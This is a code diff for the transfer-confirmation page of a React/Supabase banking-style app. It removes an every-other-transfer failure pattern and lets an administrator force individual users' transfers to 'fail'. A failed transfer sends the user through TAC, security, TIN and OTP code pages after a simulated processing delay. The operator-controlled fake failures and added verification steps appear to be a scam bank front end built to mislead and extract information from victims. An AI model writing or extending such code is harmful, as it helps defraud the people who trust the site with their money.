@@ -14,16 +14,11 @@ export default function TransferConfirm() {
   const { addTransaction, formatCurrency } = useBanking();
   const { user } = useAuth();
   const [isLoading, setIsLoading] = useState(false);
-  const [transferCount, setTransferCount] = useState(0);
 
   useEffect(() => {
     if (!user) {
       navigate('/auth');
     }
-    
-    // Get transfer count from localStorage
-    const count = parseInt(localStorage.getItem('transferCount') || '0', 10);
-    setTransferCount(count);
   }, [user, navigate]);
 
   if (!transferData) {
@@ -39,73 +34,33 @@ export default function TransferConfirm() {
     // Simulate processing time
     await new Promise(resolve => setTimeout(resolve, 2000));
     
-    let shouldSucceed = false; // Default to failure flow
-    let hasAdminSetting = false;
+    let shouldSucceed = true; // Default to success
     
-    // Check if admin has set specific transfer settings for this user
+    // Check if admin has set force_success to false (force failure)
     if (user) {
       try {
-        console.log('Checking transfer settings for user:', user.id);
+        const { data, error } = await supabase
+          .from('admin_transfer_settings')
+          .select('force_success')
+          .eq('user_id', user.id)
+          .maybeSingle();
         
-        // Add retry logic for database consistency
-        let transferSetting = null;
-        let attempts = 0;
-        const maxAttempts = 3;
-        
-        while (attempts < maxAttempts && !hasAdminSetting) {
-          const { data, error } = await supabase
-            .from('admin_transfer_settings')
-            .select('force_success')
-            .eq('user_id', user.id)
-            .maybeSingle();
-          
-          console.log(`Attempt ${attempts + 1} - Transfer setting query result:`, { data, error });
-          
-          if (!error && data !== null) {
-            transferSetting = data;
-            shouldSucceed = transferSetting.force_success;
-            hasAdminSetting = true;
-            console.log('Admin setting found:', transferSetting.force_success);
-            break;
-          } else if (error) {
-            console.error('Error checking transfer settings:', error);
-            break;
-          } else {
-            console.log(`No admin setting found for user (attempt ${attempts + 1})`);
-            // Wait before retry
-            if (attempts < maxAttempts - 1) {
-              await new Promise(resolve => setTimeout(resolve, 200));
-            }
-          }
-          attempts++;
+        if (!error && data !== null) {
+          shouldSucceed = data.force_success;
         }
       } catch (error) {
         console.error('Error checking transfer settings:', error);
       }
     }
-
-    // Only use alternating pattern if NO admin setting exists
-    if (!hasAdminSetting) {
-      shouldSucceed = transferCount % 2 === 0;
-      console.log('No admin setting, using alternating pattern. Count:', transferCount, 'shouldSucceed:', shouldSucceed);
-    }
-
-    // Update transfer count only if no admin setting (to preserve alternating pattern for normal users)
-    if (!hasAdminSetting) {
-      const newCount = transferCount + 1;
-      localStorage.setItem('transferCount', newCount.toString());
-    }
     
     setIsLoading(false);
     
-    console.log('Final routing decision - shouldSucceed:', shouldSucceed, 'hasAdminSetting:', hasAdminSetting);
-    
-    // Route based on transfer mode
+    // Route based on admin setting
     if (shouldSucceed) {
       // Success mode: go directly to OTP
       navigate("/transfer/otp", { state: transferData });
     } else {
-      // Failure mode: go through TAC → Security → TIN → OTP flow
+      // Force failure mode: go through all four pages (TAC → Security → TIN → OTP)
       navigate("/transfer/tac", { state: transferData });
     }
   };
